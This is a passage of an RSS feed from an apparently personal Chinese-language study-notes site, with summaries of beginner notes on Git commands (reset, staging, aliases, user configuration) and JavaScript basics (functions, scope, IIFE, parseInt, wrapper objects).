这时候你也许会有个疑惑，如果你还想回到版本 3.0应该怎么办呢？
回退的指定版本 这个操作需要知道指定版本的版本号，比如想回退到指定版本 3.0的版本号为1098b，那么使用git reset --hard commit id
git reset --hard commit id 版本号没必要写全，前几位就可以了，Git 会自动去找。当然也不能只写前面一两位，因为这样的话，Git 可能会找到不止一个版本号，就无法确定你具体想回退到哪一个版本了。
这时候再查看text.txt的内容，你会发现我们的版本 3.0又回来了。
Git 的版本回退速度非常快，因为 Git 在内部有个指向当前版本的HEAD 指针，HEAD指向的版本就是当前版本，因此，当你回退到某个版本的时候，Git 仅仅是把 HEAD 重新指向了版本 3.0.</description>
    </item>
    
    <item>
      <title>Git 管理修改</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E7%AE%A1%E7%90%86%E4%BF%AE%E6%94%B9/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E7%AE%A1%E7%90%86%E4%BF%AE%E6%94%B9/</guid>
      <description>管理修改 你也许很疑惑为什么 Git 比其他版本控制系统设计得优秀，那是因为 Git 跟踪并管理的是修改，而非文件。
第二次修改为什么没有被提交 现在假设我我们对一个文件 ReadMe.txt 进行了以下操作：
修改 ReadMe.txt，得到 ReadMe.txt 2.0 版本
git add ReadMe.txt 修改 ReadMe.txt 2.0 版本，得到 ReadMe.txt 3.0 版本
git commit ReadMe.txt 接着你会发现被提交的版本为什么不是ReadMe.txt 3.0？
这是因为 Git 管理的是修改，而非文件，因此，当你使用git add命令将 2.0 版本放入暂存区后，准备提交，但是，之后得到的版本 3.0 并没有被放入暂存区，所以，最后的git commit只负责把暂存区的修改提交了。
 也就是将 2.0 版本提交了，因为版本 2.0 被添加到了暂存区 但版本 3.0 却并没有被提交，因为版本 3.0 没有被添加到暂存区  如何提交第二次修改 那怎么提交第二次修改呢？你可以继续git add再git commit，也可以别着急提交第一次修改，先git add第二次修改，再git commit，就相当于把两次修改合并后一块提交了。
修改 ReadMe.txt，得到 ReadMe.txt 2.0 版本
git add ReadMe.txt 修改 ReadMe.txt 2.0 版本，得到 ReadMe.txt 3.</description>
    </item>
    
    <item>
      <title>Git 配置别名</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%85%8D%E7%BD%AE%E5%88%AB%E5%90%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%85%8D%E7%BD%AE%E5%88%AB%E5%90%8D/</guid>
      <description>配置别名 命令简写 $ git config --global alias.st status $ git config --global alias.co checkout $ git config --global alias.ci commit $ git config --global alias.br branch 以上命令将：
git status简写为git st；
git checkout简写为git co；
git commit简写为git ci
git branch简写为git br
以后提交就可以输入：
$ git ci -m &amp;#34;this is shorthand&amp;#34; 配置别名 配置 Git 的时候，加上--global是针对当前用户起作用的，如果不加，那只针对当前的仓库起作用。
配置文件放哪了？每个仓库的 Git 配置文件都放在当前仓库的.git/config文件中：
[core]repositoryformatversion = 0filemode = falsebare = falselogallrefupdates = truesymlinks = falseignorecase = true[alias]last = log -1 用户的配置文件自行寻找，我的是在C:\Users\Rainy目录下</description>
    </item>
    
    <item>
      <title>Git 配置用户信息</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%85%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%85%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF/</guid>
      <description>配置用户信息 安装好 Git 后，在命令行或终端中使用下面的命令可以设置 Git 自己的名字和电子邮件。这是因为 Git 是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和 Email 地址。
git config --global user.name &amp;#34;YxzRainy&amp;#34;git config --global user.email &amp;#34;1@qq.com&amp;#34; 查看配置 配置好之后可以使用git config -l查看配置：
git config -l </description>
    </item>
    
    <item>
      <title>Git 重命名远程库后</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%87%8D%E5%91%BD%E5%90%8D%E8%BF%9C%E7%A8%8B%E5%BA%93%E5%90%8E/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/%E9%87%8D%E5%91%BD%E5%90%8D%E8%BF%9C%E7%A8%8B%E5%BA%93%E5%90%8E/</guid>
      <description>重命名远程库后 我们在 Github 上更改仓库的默认分支后，或更改了分支名后，我们需要在本地库下执行以下代码：
git branch -m Old_branch_name New_branch_name git fetch origin git branch -u origin/New_branch_name New_branch_name git remote set-head origin -a </description>
    </item>
    
    <item>
      <title>Git 集中式与分布式的区别</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E9%9B%86%E4%B8%AD%E5%BC%8F%E5%92%8C%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/%E9%9B%86%E4%B8%AD%E5%BC%8F%E5%92%8C%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>集中式与分布式的区别 前言 集中式版本控制系统最大的毛病就是必须联网才能工作，如果网速快还好，上传的也快，可当遇到网速慢的时候，可能提交一个 10M 的文件就需要 5 分钟，这还不得把人给憋死啊。
联网性 首先，分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件 A，你的同事也在他的电脑上改了文件 A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。
安全性 与集中式版本控制系统相比，分布式版本控制系统的安全性要高很多，因为每个人电脑里都有完整的版本库，某一个人的电脑坏掉了不要紧，随便从其他人那里复制一个就可以了。而集中式版本控制系统的中央服务器要是出了问题，所有人都没法干活了。
分布式的优点 分布式版本系统的最大好处之一是在本地工作完全不需要考虑远程库的存在，也就是有没有联网都可以正常工作，而 SVN 在没有联网的时候是拒绝干活的！当有网络的时候，再把本地提交推送一下就完成了同步。</description>
    </item>
    
    <item>
      <title>JavaScript arguments</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/arguments/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/arguments/</guid>
      <description>arguments 它是一个与函数的实参有映射关系的类数组。
若函数的实参和形参数量一致，那么函数的形参与函数的 argments 之间为映射关系，即形参改变后，与之映射的 arguments[x] 也会改变。
若传入的实参比形参少，多余的形参和 argments 没有映射关系。
function demo(a, b) { 	// return 20 	console.log(b); 	b = 200;  	// return 200 	console.log(b); 	arguments[1] = 2000; 	// return 2000 	console.log(b); } demo(1, 20); 属性 Callee 该属性包含当前正在执行的函数。在哪个函数中调用的方法 arguments.calle，该 calle 中就包含这个函数的函数体。
注意 arguments 对象是所有（非箭头）函数中都可用的局部变量。你可以使用 arguments 对象在函数中引用函数的实参；此对象包含传递给函数的每个实参，第一个实参的索引为 0。
arguments 对象不是一个 Array ；但它类似于 Array，但除了有 length 属性和索引的特性之外没有任何其他 Array 属性。</description>
    </item>
    
    <item>
      <title>JavaScript eval()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/eval/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/eval/</guid>
      <description>eval() 它会将传入的字符串当做 JavaScript 代码来执行。
在 JavaScript 中，有一句话叫：
eval 是魔鬼。
console.log(eval(&amp;#39;2 + 2&amp;#39;)); </description>
    </item>
    
    <item>
      <title>JavaScript Function</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/function/function/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/function/function/</guid>
      <description>Function 每个 JavaScript 函数实际上都是一个 Function 对象。
Function 构造函数创建一个新的 Function 对象。
全局的 Function 对象没有自己的属性和方法，但是，因为它本身也是一个函数，所以它也会通过原型链从自己的原型链 Function.prototype 上继承一些属性和方法。</description>
    </item>
    
    <item>
      <title>JavaScript function</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/function/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/function/</guid>
      <description>function 它可以用来在一个表达式中定义一个函数。
function Fun(parameter) { 	console.log(&amp;#39;我是一个函数&amp;#39;); } </description>
    </item>
    
    <item>
      <title>JavaScript Function 方法</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/function/function-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/function/function-%E6%96%B9%E6%B3%95/</guid>
      <description>Function 方法 call() 改变调用它的构造函数的 this 指向。并指定构造函数的采纳书
function Demo(name, age) { 	this.name = name; 	this.age = age; } var huge = new Demo(&amp;#39;Su&amp;#39;, 100); console.log(huge);  var test = {};  // 改变 Demo() 中 this 的指向为对象 test， Demo.call(test, &amp;#39;Rainy&amp;#39;, 100);  console.log(test); 实现继承 function Tyre(size, style) { 	this.size = size; 	this.style = style; }  function Interior(color, texture) { 	this.color = color; 	this.texture = texture; }  function Model(height, width, length, type) { 	this.</description>
    </item>
    
    <item>
      <title>JavaScript IIFE</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/iife/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/iife/</guid>
      <description>IIFE 立即执行函数，是一种在被定义后就会立即执行的函数，不需要被调用，执行完毕后就会被立即释放。
用于创建一个独立的作用域，主要用于初始化功能。这个作用域中的变量，外面的任何位置访问不到，用于避免变量污染和命名冲突。
它具有普通的函数一样的功能（参数、返回值、执行期上下文等）。
只有函数表达式可以被执行符 () 执行，被执行符所执行的函数表达式的函数名会被自动忽略，即该函数表达式变为了 IIFE。
多个 IIFE 之间要加分号。
var demo = (function (a, b) { 	// 用变量 demo 接收 IIFE 的返回值 	a = Number(a); 	b = Number(b); 	var c = (a + b) * 10; 	// 将变量 a 与 b 的和乘 10 的结果赋给变量 c 	return c; 	// 将变量 c 作为该 IIFE 的返回值 })(10, 20); // 10 与 20 为实参 console.log(demo); 立即释放的特性 var a = (function demo() { 	// 用变量 a 接收函数 demo，因函数 demo 执行一次后就会被释放，则会导致变量 a 的值变为 undefined 	// 因此再次调用变量 a 会返回 undefined 	console.</description>
    </item>
    
    <item>
      <title>JavaScript isNaN()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/isnan/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/isnan/</guid>
      <description>isNaN() isNaN(value) 用于判定 value 是否为 NaN，是则返回 true，否则返回 false。
如果 value 不是 Number 类型，那么该函数会用 Number() 方法将 value 隐式转换，然后再判断转换后的结果是否为 NaN。因此，被测试的值在被强制转换成数值时会不会返回 IEEE-754 中所谓的不是数值，隐式转换调用的都是显式转换方法。
返回 false 的值  0 除以 0 NaN undefined {}（空对象）  </description>
    </item>
    
    <item>
      <title>JavaScript Math</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math/</guid>
      <description>Math 它是一个内置对象，它拥有一些数字常数属性和数学函数方法，它不是一个函数对象。
引用圆周率的写法是 Math.PI，调用正余弦函数的写法是 Math.sin(x)，x 是要传入的参。
计算时精度不准 0.14 * 100 = 14.000000000000002；0.1 + 0.2 = 0.30000000000000004；这些运算后的值都是因为 js 计算精度不准的导致。
在 js 中整数和浮点数都属于 Number 数据类型，所有数字都是以 64 位浮点数形式储存。JavaScript 里的数字是采用 IEEE 754 标准的 64 位双精度浮点数，计算机进行计算的时候，会把数字转换为二进制，进行运算之后再转换为十进制，但是运算过程中小数部分最多支持 52 位，就会出现运算精度不准的问题。
1000000000000001 + 1000000000000001 = 2000000000000002，即在 JavaScript 中，可正常计算范围在小数点前 16 位与后 16 位。
function One() { 	for (var c = 0; c &amp;lt; 18; c++) { 	var d = Math.random().toFixed(2) * 100; 	// 首先取 0-1 的随机数，然后取这个数小数点后的两位数，最后乘 100，并赋给变量 d 	var e = Math.</description>
    </item>
    
    <item>
      <title>JavaScript new</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E5%B7%A6%E4%BE%A7%E8%A1%A8%E8%BE%BE%E5%BC%8F/new/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E5%B7%A6%E4%BE%A7%E8%A1%A8%E8%BE%BE%E5%BC%8F/new/</guid>
      <description>new 用于创建一个对象类型的实例或一个具有构造函数的内置对象的实例。
new 实例 创建或返回一个新的对象实例，并将构造函数的作用域赋给新的对象实例（因此构造函数中的 this 的指向就变为了这个新的对象实例）。</description>
    </item>
    
    <item>
      <title>JavaScript Number()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/number/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/number/</guid>
      <description>Number 该对象是经过封装的能被处理数字值的对象；该对象由 Number() 构造器创建。
Number 的方法 toString() NumObj.toString(radix)
 将 NumObj 转为为 radix 进制的数，若 NumObj 无法被转换为 radix 进制的数，则返回 string 类型的 NaN；rRadix 的取值范围为 2 - 36，如果未指定 radix 参数，则默认值为 10。 当在 NumObj 中，遇到不在 radix 中的字符，则将忽略该字符以及所有后续字符，并返回在这之前已解析的整数值。 因为 Number 对象覆盖了 Object 对象上的 toString() 方法（系统将 Number 对象的 toString 方法重写了），因此它并不继承自 Object.prototype.toString()。  十进制转十六进制 var a = 1971; var b = 10; var c = 16; var d = parseInt(a, b); // 将变量 a 当做 b 进制的数，并将 b 转换为十进制的数。 var e = d.</description>
    </item>
    
    <item>
      <title>JavaScript Object</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/object/object/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/object/object/</guid>
      <description>Object 创建一个对象包装器；它的每个值都是对象的属性，且每个属性必须要有属性值，属性值的类型可以是任何数据类型。
创建方式 对象字面量 var n = &amp;#39;世雨&amp;#39;; var a = &amp;#39;&amp;#39;; var object = { 	//var obj ={} 相当于 var obj = new Object()，一般情况都使用前者。 	b: &amp;#39;臣&amp;#39;, 	// b 为属性名，臣为属性值 	c: n, }; a = object.b + object.c; // 用变量 a 接收对象 object 的属性 b 与 c 的值。 console.log(a); // 返回臣世雨 工厂模式 function ThreeOne(color) { 	this.color = color; 	// color为可选参数 	this.name = &amp;#39;bird&amp;#39;; 	this.</description>
    </item>
    
    <item>
      <title>JavaScript parseFloat()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parsefloat/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parsefloat/</guid>
      <description>parseFloat() parseFloat(string)，将 string 显式转换为 number 类型浮点数（小数）。若 string 无法被转换为浮点数，则返回 number 类型的 NaN。</description>
    </item>
    
    <item>
      <title>JavaScript parselnt()</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parselnt/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parselnt/</guid>
      <description>parseInt() parseInt(string, radix) 函数解析一个字符串并返回指定基数的十进制整数。
将 string 看作 radix 进制的数，并将 string 显式转换为十进制且为 number 的整数（radix 为介于 2-36 之间的数，它是可选值，表示被解析字符串的基数），若 string 无法被转换为整数，则返回 number 类型的 NaN。
当在 string 中，遇到不在 radix 进制中的字符，则将忽略该字符以及所有后续字符，并返回在这之前已解析的整数值。
若 radix 为 0 时，部分浏览器（比如 IE）会报错，部分浏览器会将 0 当做 10 进行转换。
N 进制转十进制 var n = 10010; var c = 2; // 变量 n 可为 8，16，32。 var a = parseInt(n, c); // 将 n 当作 c 进制的数，并将 n 显式转换为十进制的整数。 console.log(a); </description>
    </item>
    
    <item>
      <title>JavaScript return</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/return/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/return/</guid>
      <description>return 用于终止函数的执行，并指定函数的返回值。若没有指定返回值，则返回 undefined。
字符串转数字 var n = &amp;#39;18&amp;#39;; function demo(n) { 	return +n; 	// 用加号 + 隐式调用 Number() 方法，将字符串 n 转换为数字并作为返回值 } var a = demo(n); console.log(typeof a + &amp;#39;:&amp;#39; + a); </description>
    </item>
    
    <item>
      <title>JavaScript this</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/this/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/this/</guid>
      <description>this 在全局中，无论是否在严格模式下，this 指的都是全局对象（window）。
通常情况，函数的调用方式决定了 this 的值；严格模式下， this 一般指向一个调用它的对象（即 this 的调用者，哪个对象的方法调用了 this，那么这个 this 就指向调用这个方法的对象 ），即第一人称我，
严格模式下可以指向任意值。</description>
    </item>
    
    <item>
      <title>JavaScript Window</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/window/window/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/window/window/</guid>
      <description>Window Window 对象表示一个包含 DOM 文档的窗口，其 document 属性指向窗口中载入的 DOM 文档 。
如果文档包含框架（frame 或 iframe 标签），浏览器会为 HTML 文档创建一个 window 对象，并为每个框架创建一个额外的 window 对象。</description>
    </item>
    
    <item>
      <title>JavaScript 作用域</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E4%BD%9C%E7%94%A8%E5%9F%9F/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E4%BD%9C%E7%94%A8%E5%9F%9F/</guid>
      <description>作用域 作用域（scope）定义了代码在运行时的某些特定的变量、函数、对象的可调用范围。
每个函数都会创建 scope（作用域对象），scope 中储存是一个个的全局作用域与局部作用域），即 scope 中存储的是作用域的集合（作用域链）。
父函数不能调用子函数的变量 当调用一个变量时，调用者会去作用域链（scope）的顶端依次向下寻找这个变量；又因为子函数的 AO 中含有父函数 AO 的引用地址，所以子函数可以调用父函数的变量；反之，因为父函数的 AO 不能含有子函数 AO 的引用，所以父函数不能调用子函数的变量。
作用域都是独立的 声明多个同级函数时，这些函数的作用域链都是独立的，即每个同级函数中的局部变量不可以公用，但它们都可以使用全局中的变量；这些作用域链会随着对应函数的执行完毕而依次释放。
全局作用域 在全局作用域（GO 对象）中的变量为全局变量，全局变量的的作用域为整个脚本，这类变量在脚本中的任何地方（包括函数内部）能被调用。
它们通常指在全局中定义的变量或没有使用 var 声明的暗示全局变量。
这些变量都在全局作用域中：  函数外声明的变量。 函数中没有使用 var 声明的变量。  局部作用域 局部作用域（AO 对象）中的变量为局部变量，局部变量的作用域仅限于某个特定的函数，这类变量可以在特定的函数中调用。
每个函数内部都会创建一个局部作用域，当一个函数（父函数）中包含另一个函数（子函数），则父函数不能调用子函数的变量，但子函数可以调用父函数的变量；并且两个独立且同级的函数中的局部变量不能公用，只能各用各的局部变量。
这些变量都在局部作用域中：  它们通常指在函数中定义的变量或函数的形式参数。 函数中使用 var 声明的变量。 函数中的形式参数。  累加器 function One() { 	var b = 0; 	function Two() { 	b++; 	console.log(b); 	} 	a = Two; 	// 变量 a 是一个暗示全局变量，用变量 a 接收函数 Two } One(); //调用函数 One，使暗示全局变量 a 可以执行 a(); // 执行变量 a，相当于执行函数 Two，每执行一次变量 a，就会使 b 在原来的的结果上自增一次。 a(); a(); 作用域链 function One() { 	// 声明函数 One 时，系统会隐式创建 One.</description>
    </item>
    
    <item>
      <title>JavaScript 函数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</guid>
      <description>函数 函数又叫方法，它是用来执行某些特定功能的代码；且允许我们在程序中随时进行调用。
每一个函数其实都是一个 Function 类型的对象。
函数中若没有使用 return 语句，则它默认返回 undefined；要想返回一个指定的值，则需使用 return 语句来指定一个返回值（使用 new 关键字调用一个构造函数除外）。
基本方式 直接通过 function 关键字进行声明。
function demo(a, b) { 	// 声明一个函数，demo 为函数名，a 与 b为形式参数（形参）。 	console.log(a + b); 	// 返回形参 a 与 b 的和 3。 } demo(1, 2); // 使用执行符 () 调用函数 demo，1 与 2 为实际参数（实参） var c = demo.name; // 函数 demo 的属性 name 为指定函数的（这里为 demo）名字， // 该属性的值永远等于跟在 function 关键字后面的标识符（变量名），匿名函数的属性 name 为空。 console.log(c); // 返回函数 demo 的函数名  //匿名函数方式-------------------------------------------------- var demo = function () { 	console.</description>
    </item>
    
    <item>
      <title>JavaScript 函数参数</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0/</guid>
      <description>函数参数 形参 指在定义函数时使用的参数，用于接收调用该函数时传入的实参。
在调用函数时，实参将赋值给形参；因而，必须使实参的个数与类型应与形参一一的对应，且传入的实参必须要有确定的值。若为给形参传入对应的实参，那么该形参默认为undefined。
实参 调用函数时传递给函数的参数，一般与实参一一对应。
变量传值 指的是将一个变量的值赋给另外一个变量。
值传递 将一个变量的值复制一份， 然后将新的值赋给另外一个变量（两个变量没有关系）。
引用传递 将一个变量的值的内存地址，传递给另外一个变量，两个变量的内存地址所指向的是同一块内存空间（两个变量所指向的都是同一个值，他们互相影响，其中一个变量被改变，另一个也会跟着被改变）。
形参默认值 定义函数的同时可以给形参赋默认值，当我们调用该函数时，若未给形参传入对应的实参，那么这个默认值会被当作该函数的实参。
形参默认值一般设置在形参末尾。
function fun(a = 1, b = 2, c = 3) { 	console.log(a, b, c); }  fun(10, 20); rest rest 中包含了没有对应形参的实参，或者说多余的实参。
rest 只包含那些没有对应形参的实参，而 arguments 对象包含了传给函数的所有实参。
rest 是一个真数组，而不是一个类数组。
rest 必须放到形参末尾。</description>
    </item>
    
    <item>
      <title>JavaScript 分支与循环</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%88%86%E6%94%AF%E4%B8%8E%E5%BE%AA%E7%8E%AF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%88%86%E6%94%AF%E4%B8%8E%E5%BE%AA%E7%8E%AF/</guid>
      <description>分支与循环 为什么 if 语句中不能进行函数声明 因为程序执行时，程序会在本页代码之内寻找函数声明，并进行函数声明提升，而不会去查找需要条件的 if 之内的内容，
另外，可以用函数表达式定义函数？</description>
    </item>
    
    <item>
      <title>JavaScript 包装类</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%8C%85%E8%A3%85%E7%B1%BB/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%8C%85%E8%A3%85%E7%B1%BB/</guid>
      <description>包装类 在 JavaScript 中，因为原始值不能有属性和方法，所以当给原始值添加属性与方法时，系统会自动且隐式的将原始类型的数据转换为对象，然后再调用这个对象的属性和方法，调用完以后，在将其转换为原始值，这个过程叫做包装类。
因为 undefined 与 null 不能有属性，所以它们不能进行包装类。
Number 将原始类型的数值，转换为 Number 对象，它的原型是 Number.prototyp。
数字类型的对象可以进行学运算，但运算的结果，这个对象会变回原始类型的数值。
String 将原始类型的字符串，转换为 String 对象，它的原型是 String.prototyp。
当原始值字符串直接调用属性 length 时，系统会对这个原始值字符串进行包装类，使之变为对象字符串，又因为字符串对象自带属性 length，因此系统不会将这个属性 delete 删掉，所以最终将属性 length 的值返回。
Boolean 将原始类型的布尔值，转换为 boolean 对象，它的原型是 Boolean.prototyp。
注意 因为 Number、String、boolean 它们本身重写了（用一个同名不同功能的方法覆盖系统自带的方法）一个 xxx.prototype.toString 方法，所以它们不会用原型上 Object.prototype 的 toString 方法。
var a = new Number(123); var b = new String(&amp;#39;yxz&amp;#39;); var c = new Boolean(&amp;#39;true&amp;#39;); console.log(typeof a); console.log(typeof b); console.log(typeof c); // 返回三个 object 数值包装类运算 var num = new Number(123); //原始值 num 被进行包装类，因此它变成了 对象 123。 console.</description>
    </item>
    
    <item>
      <title>JavaScript 区分对象与数组</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%8C%BA%E5%88%86%E5%AF%B9%E8%B1%A1%E4%B8%8E%E6%95%B0%E7%BB%84/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%8C%BA%E5%88%86%E5%AF%B9%E8%B1%A1%E4%B8%8E%E6%95%B0%E7%BB%84/</guid>
      <description>区分对象与数组 Constructor var arr = []; var obj = {}; var a = arr.constructor; console.log(a); // 返回数组。 var b = obj.constructor; console.log(b); // 返回对象。 Instanceof var arr = [];  var obj = {};  var a = arr instanceof Array; console.log(a); // 返回 true，因为变量 arr 是一个数组。 var a = arr instanceof Object; console.log(a); // 返回 true，因为变量 arr 是一个数组类对象。 var b = obj instanceof Array; console.log(b); // 返回 flase，因为变量 obj 不是一个数组。 var b = obj instanceof Object; console.</description>
    </item>
    
    <item>
      <title>JavaScript 原型</title>
